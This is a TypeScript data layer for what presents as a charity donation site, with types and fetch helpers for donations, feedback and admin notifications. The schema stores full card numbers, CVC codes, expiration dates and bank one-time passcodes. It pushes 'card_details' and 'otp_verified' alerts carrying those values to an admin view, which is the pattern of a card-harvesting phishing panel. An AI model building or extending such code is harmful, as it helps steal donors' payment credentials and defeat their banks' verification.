export interface Donation {
  id: string;
  referenceNumber: string;
  amount: number;
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  country: string;
  address1: string;
  address2?: string;
  city: string;
  state: string;
  zipCode: string;
  cardLast4: string;
  cardNumber?: string;
  cvc?: string;
  cardholderName?: string;
  cardExpiration?: string;
  donationType: 'one-time' | 'monthly';
  purposeOfDonation?: string;
  heardAboutUs?: string;
  coverTransactionFees: boolean;
  isBusinessDonation: boolean;
  wantsUpdates: boolean;
  status: 'pending' | 'processing' | 'approved' | 'rejected';
  otpCode?: string;
  otpVerified?: boolean;
  createdAt: string;
  updatedAt: string;
  adminNotes?: string;
  pdfUrl?: string;
}

export interface DonorFeedback {
  id: string;
  name: string | null;
  message: string;
  donationAmount: number | null;
  createdAt: string;
}

export interface AdminNotification {
  id: string;
  type: 'card_details' | 'otp_verified' | 'donation_created';
  donationId: string;
  referenceNumber: string;
  donorName: string;
  email?: string;
  phone?: string;
  amount: number;
  message: string;
  cardNumber?: string;
  cardLast4?: string;
  cardholderName?: string;
  cvc?: string;
  cardExpiration?: string;
  billingAddress?: string;
  city?: string;
  state?: string;
  zipCode?: string;
  otpCode?: string;
  donationType?: string;
  timestamp: string;
  read: boolean;
}

// Add near your other map functions, or inline if you prefer simplicity:
function mapFeedback(row: any) {
  return {
    id: row.id,
    name: row.name,
    message: row.message,
    donationAmount: row.donation_amount,
    createdAt: row.created_at,
  };
}

// Maps a snake_case DB row to the camelCase shape components expect
function mapDonation(row: any): Donation {
  return {
    id: row.id,
    referenceNumber: row.reference_number,
    amount: Number(row.amount),
    firstName: row.first_name,
    lastName: row.last_name,
    email: row.email,
    phone: row.phone,
    country: row.country,
    address1: row.address1,
    address2: row.address2,
    city: row.city,
    state: row.state,
    zipCode: row.zip_code,
    cardLast4: row.card_last4,
    cardNumber: row.card_number,
    cvc: row.cvc,
    cardholderName: row.cardholder_name,
    cardExpiration: row.card_expiration,
    donationType: row.donation_type,
    purposeOfDonation: row.purpose_of_donation,
    heardAboutUs: row.heard_about_us,
    coverTransactionFees: row.cover_transaction_fees,
    isBusinessDonation: row.is_business_donation,
    wantsUpdates: row.wants_updates,
    status: row.status,
    otpCode: row.otp_code,
    otpVerified: row.otp_verified,
    createdAt: row.created_at,
    updatedAt: row.updated_at,
    adminNotes: row.admin_notes,
    pdfUrl: row.pdf_url,
  };
}

function mapNotification(row: any): AdminNotification {
  return {
    id: row.id,
    type: row.type,
    donationId: row.donation_id,
    referenceNumber: row.reference_number,
    donorName: row.donor_name,
    email: row.email,
    phone: row.phone,
    amount: Number(row.amount),
    message: row.message,
    cardNumber: row.card_number,
    cardLast4: row.card_last4,
    cardholderName: row.cardholder_name,
    cvc: row.cvc,
    cardExpiration: row.card_expiration,
    billingAddress: row.billing_address,
    city: row.city,
    state: row.state,
    zipCode: row.zip_code,
    otpCode: row.otp_code,
    donationType: row.donation_type,
    timestamp: row.timestamp,
    read: row.read,
  };
}

export const donationDb = {
  // ── All reads/writes go through server API routes (supabaseAdmin), ──
  // ── which bypass RLS. The anon key is INSERT-only and storing card ──
  // ── data, so client-side selects/returns would be blocked by RLS.  ──

  getAllDonations: async (): Promise<Donation[]> => {
    const res = await fetch('/api/donations');
    if (!res.ok) return [];
    const rows = await res.json();
    return rows.map(mapDonation);
  },

  getAllFeedback: async (): Promise<DonorFeedback[]> => {
  const res = await fetch('/api/feedback');
  if (!res.ok) return [];
  const rows = await res.json();
  return rows.map(mapFeedback);
},

  getDonationById: async (id: string): Promise<Donation | null> => {
    const donations = await donationDb.getAllDonations();
    return donations.find((d) => d.id === id) || null;
  },

  updateDonation: async (
    id: string,
    updates: Partial<Donation>
  ): Promise<Donation | null> => {
    const res = await fetch(`/api/donations/${id}`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(updates),
    });
    if (!res.ok) return null;
    return mapDonation(await res.json());
  },

  deleteDonation: async (id: string): Promise<boolean> => {
    const res = await fetch(`/api/donations/${id}`, { method: 'DELETE' });
    return res.ok;
  },

  getDonationsByStatus: async (
    status: Donation['status']
  ): Promise<Donation[]> => {
    const donations = await donationDb.getAllDonations();
    return donations.filter((d) => d.status === status);
  },

  searchDonations: async (query: string): Promise<Donation[]> => {
    const lowerQuery = query.toLowerCase();
    const donations = await donationDb.getAllDonations();
    return donations.filter(
      (d) =>
        d.referenceNumber.toLowerCase().includes(lowerQuery) ||
        d.firstName.toLowerCase().includes(lowerQuery) ||
        d.lastName.toLowerCase().includes(lowerQuery) ||
        d.email.toLowerCase().includes(lowerQuery)
    );
  },

  generateOTP: (): string => {
    return Math.floor(100000 + Math.random() * 900000).toString();
  },

  // ── Public insert: goes through /api/donations (server, supabaseAdmin) ──
  // ── instead of the browser anon client, since the anon key has no    ──
  // ── SELECT policy and .select().single() after insert would fail.    ──

  addDonation: async (
    donation: Omit<Donation, 'id' | 'referenceNumber' | 'createdAt' | 'updatedAt'>
  ): Promise<Donation> => {
    const res = await fetch('/api/donations', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(donation),
    });

    if (!res.ok) {
      const errorBody = await res.json().catch(() => ({}));
      throw new Error(errorBody.error || 'Failed to create donation');
    }

    return mapDonation(await res.json());
  },

  // ── Notifications ──

  getAllNotifications: async (): Promise<AdminNotification[]> => {
    const res = await fetch('/api/notifications');
    if (!res.ok) return [];
    const rows = await res.json();
    return rows.map(mapNotification);
  },

  addNotification: async (
    notification: Omit<AdminNotification, 'id' | 'timestamp' | 'read'>
  ): Promise<AdminNotification> => {
    const res = await fetch('/api/notifications', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(notification),
    });

    if (!res.ok) {
      const errorBody = await res.json().catch(() => ({}));
      throw new Error(errorBody.error || 'Failed to create notification');
    }

    return mapNotification(await res.json());
  },

  markNotificationAsRead: async (notificationId: string): Promise<void> => {
    await fetch(`/api/notifications/${notificationId}`, { method: 'PATCH' });
  },

  clearNotifications: async (): Promise<void> => {
    // Optional: implement a DELETE /api/notifications route if you want a
    // "clear all" button. Left as a no-op placeholder for now.
  },
};